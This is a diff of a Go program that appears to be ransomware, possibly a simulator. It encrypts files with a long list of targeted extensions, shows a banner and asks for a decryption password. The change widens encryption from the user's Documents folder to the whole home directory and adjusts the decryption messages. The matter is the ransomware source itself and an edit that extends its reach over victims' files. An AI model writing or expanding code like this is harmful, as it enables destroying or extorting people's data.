@@ -37,7 +37,8 @@ func main() {
 		Only encrypt files and folders in this directory & subdirectories.
 		TODO: Update File discovery to exclude SYSTEM owned files.
 	*/
-	rootDir := userHomeDir() + "\\Documents\\"
+	rootDir := userHomeDir() + "\\"
+	fmt.Println(rootDir)
 	// Art Banner
 	banner := color.Red.Sprint(`
 	
@@ -58,7 +59,7 @@ func main() {
 	// Password Prompt
 	decrypt := color.Magenta.Sprint("Enter Decryption Password:")
 	// Decrypted Files Array:
-	decryptFiles := color.Green.Sprint("The following files have been decrypted:")
+	decryptFiles := color.Green.Sprint("The above files have been decrypted")
 	// Only Encrypt these file extensions.
 	fileExtensions := []string{
 		"3dm", "max", "3ds", "uot", "stw", "sxw", "ott", "odt", "rpm",
@@ -121,8 +122,8 @@ func main() {
 		for _, file := range encryptedfiles {
 			// Decrypts files if password is correct.
 			enc := encryption.NewEncryption(file, key)
-			color.Println(decryptFiles)
 			enc.DecryptFile()
+			color.Println(decryptFiles)
 		}
 		fmt.Println(encryptedfiles)
 		// Print an error if decryption fails.
